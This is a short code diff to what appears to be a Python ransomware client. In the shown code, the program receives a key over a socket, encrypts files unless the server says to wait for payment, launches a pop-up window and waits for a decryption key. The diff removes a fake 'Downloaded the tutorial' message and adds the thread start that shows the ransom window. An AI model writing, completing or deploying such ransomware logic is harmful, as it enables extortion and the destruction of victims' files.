@@ -144,15 +144,14 @@ if __name__ == "__main__":
                     and should just wait until payment is complete
                     '''
                     if data.decode() != 'wait':
+                        print("encrypting")
                         key = data.decode()
                         encryptFiles(key)
-                    
-                    toc = time.perf_counter()
-                    print(f"Downloaded the tutorial in {toc - tic:0.4f} seconds")
                     
                     # set up thread for tkinter window
                     t1 = Thread(target=interface.App().pop_up_win)
                     t1.daemon = True
+                    t1.start()
 
                     # recv waits for new input of key to decrypt
                     key = s.recv(4096)
